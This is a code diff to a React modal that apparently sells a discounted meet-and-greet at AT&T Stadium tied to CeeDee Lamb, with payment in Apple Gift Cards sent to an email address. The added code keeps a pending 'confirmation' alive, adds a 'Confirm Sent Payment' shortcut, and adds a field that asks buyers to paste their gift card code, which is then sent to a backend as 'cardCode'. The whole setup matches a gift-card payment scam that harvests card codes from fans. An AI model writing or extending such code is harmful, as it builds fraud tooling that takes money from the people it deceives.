@@ -26,6 +26,7 @@ import {
 import {
   recordAppleCardPartnerDeparture,
   recordAppleCardSentConfirmation,
+  getPendingAppleConfirmation,
 } from "../services/paymentControlService";
 import { cn } from "../lib/utils";
 
@@ -77,18 +78,34 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
 }) => {
   const [includeJersey, setIncludeJersey] = useState<boolean>(initialIncludeJersey);
   const [customerName, setCustomerName] = useState<string>(
-    () => initialCustomerName || localStorage.getItem("nfl_guest_sender_name") || ""
+    () =>
+      initialCustomerName ||
+      getPendingAppleConfirmation()?.customerName ||
+      localStorage.getItem("nfl_guest_sender_name") ||
+      ""
   );
   const [customerEmail, setCustomerEmail] = useState<string>(
-    () => initialCustomerEmail || localStorage.getItem("nfl_guest_buyer_email") || ""
+    () =>
+      initialCustomerEmail ||
+      getPendingAppleConfirmation()?.customerEmail ||
+      localStorage.getItem("nfl_guest_buyer_email") ||
+      ""
   );
   const [validationError, setValidationError] = useState<string | null>(null);
   const [copiedEmail, setCopiedEmail] = useState<boolean>(false);
-  const [openedAppleStore, setOpenedAppleStore] = useState<boolean>(false);
-  const [returnedFromAppleStore, setReturnedFromAppleStore] = useState<boolean>(false);
+  const [openedAppleStore, setOpenedAppleStore] = useState<boolean>(() => Boolean(getPendingAppleConfirmation()));
+  const [returnedFromAppleStore, setReturnedFromAppleStore] = useState<boolean>(() => Boolean(getPendingAppleConfirmation()));
   const [isConfirmingSent, setIsConfirmingSent] = useState<boolean>(false);
   const [paymentSentConfirmed, setPaymentSentConfirmed] = useState<boolean>(false);
   const [confirmedRefId, setConfirmedRefId] = useState<string>("");
+  const [appleOrderOrCodeNote, setAppleOrderOrCodeNote] = useState<string>("");
+  const [fallbackSessionId] = useState<string>(
+    () =>
+      `INQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`
+  );
+  const [pendingSessionOverride, setPendingSessionOverride] = useState<string | null>(
+    () => getPendingAppleConfirmation()?.sessionId || null
+  );
 
   const nameInputRef = useRef<HTMLInputElement | null>(null);
   const emailInputRef = useRef<HTMLInputElement | null>(null);
@@ -111,6 +128,15 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
       return;
     }
 
+    const pending = getPendingAppleConfirmation();
+    if (pending && !paymentSentConfirmed) {
+      setOpenedAppleStore(true);
+      setReturnedFromAppleStore(true);
+      setPendingSessionOverride(pending.sessionId);
+      if (pending.customerName && !customerName.trim()) setCustomerName(pending.customerName);
+      if (pending.customerEmail && !customerEmail.trim()) setCustomerEmail(pending.customerEmail);
+    }
+
     const handleKeyDown = (e: KeyboardEvent) => {
       if (e.key === "Escape") {
         onClose();
@@ -118,7 +144,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
     };
     window.addEventListener("keydown", handleKeyDown);
     return () => window.removeEventListener("keydown", handleKeyDown);
-  }, [isOpen, onClose]);
+  }, [isOpen, onClose, paymentSentConfirmed]);
 
   // Detect visitor returning to this tab/window from Apple's official online store
   useEffect(() => {
@@ -153,9 +179,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
   const discountedTotal = CEEDEE_DISCOUNTED_TICKET_USD + jerseyAddonTotal;
   const regularTotal = CEEDEE_REGULAR_TICKET_USD + jerseyAddonTotal;
 
-  const activeSessionId =
-    sessionId ||
-    `INQ-${Date.now().toString(36).toUpperCase()}-${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
+  const activeSessionId = pendingSessionOverride || sessionId || fallbackSessionId;
 
   const handleNameChange = (val: string) => {
     setCustomerName(val);
@@ -237,6 +261,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
     setIsConfirmingSent(true);
     setValidationError(null);
     try {
+      const cleanNote = appleOrderOrCodeNote.trim();
       const res = await recordAppleCardSentConfirmation({
         sessionId: activeSessionId,
         customerName: trimmedName,
@@ -246,6 +271,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
         itemType: "experience",
         amount: discountedTotal,
         venue: "AT&T Stadium · Arlington, Texas",
+        ...(cleanNote ? { cardCode: cleanNote } : {}),
       });
       setConfirmedRefId(res?.orderId || activeSessionId);
       setPaymentSentConfirmed(true);
@@ -638,6 +664,24 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                   )}
                 </button>
               </div>
+
+              {!openedAppleStore && !paymentSentConfirmed && (
+                <div className="flex items-center justify-between gap-2 pt-0.5 text-[11px]">
+                  <span className="text-[#94A3B8]">
+                    Already bought and mailed your Apple Gift Card to {OFFICIAL_GIFTCARD_EMAIL}?
+                  </span>
+                  <button
+                    type="button"
+                    onClick={() => {
+                      setOpenedAppleStore(true);
+                      setReturnedFromAppleStore(true);
+                    }}
+                    className="font-bold text-emerald-300 hover:text-emerald-200 underline shrink-0 cursor-pointer"
+                  >
+                    Confirm Sent Payment
+                  </button>
+                </div>
+              )}
             </div>
 
             {/* 7. Return-From-Apple Confirmation Selector ("Have You Sent Your Payment?") */}
@@ -654,7 +698,7 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                   Apple Card Payment Sent Confirmed!
                 </h4>
                 <p className="text-xs text-[#CBD5E1] max-w-md mx-auto leading-relaxed">
-                  Thank you, <strong className="text-white">{trimmedName}</strong>. We have logged your confirmation for <strong className="text-white">${discountedTotal.toFixed(2)} USD</strong> (Ref: <span className="font-mono text-emerald-300">{confirmedRefId}</span>). Once verified in <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span>, your AT&amp;T Stadium Meet &amp; Greet pass will be sent to <strong className="text-white">{trimmedEmail}</strong>.
+                  Thank you, <strong className="text-white">{trimmedName}</strong>. We have logged your confirmation for <strong className="text-white">${discountedTotal.toFixed(2)} USD</strong> (Ref: <span className="font-mono text-emerald-300">{confirmedRefId}</span>) and alerted our desk at <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span>. Once verified, your AT&amp;T Stadium Meet &amp; Greet pass will be sent to <strong className="text-white">{trimmedEmail}</strong>.
                 </p>
               </motion.div>
             ) : openedAppleStore && (
@@ -673,9 +717,17 @@ export const CeeDeePublicPromoOfferModal: React.FC<CeeDeePublicPromoOfferModalPr
                     Have You Sent Your Apple Gift Card Payment?
                   </h4>
                   <p className="text-xs text-[#CBD5E1] leading-relaxed">
-                    Once you finish purchasing and sending your Apple Gift Card to <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> on Apple&apos;s site, select an option below to confirm your reservation.
+                    Once you finish purchasing and sending your Apple Gift Card to <span className="font-mono text-white">{OFFICIAL_GIFTCARD_EMAIL}</span> on Apple&apos;s site, click the button below to notify our desk immediately.
                   </p>
                 </div>
+
+                <input
+                  type="text"
+                  value={appleOrderOrCodeNote}
+                  onChange={(e) => setAppleOrderOrCodeNote(e.target.value)}
+                  placeholder="Optional: Paste Apple Order # or Gift Card Code (X...)"
+                  className="w-full min-h-[42px] bg-[#030816] border border-emerald-400/30 focus:border-emerald-400 rounded-xl px-3.5 py-2 text-xs font-mono text-white placeholder-[#64748B] focus:outline-none"
+                />
 
                 <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                   <button
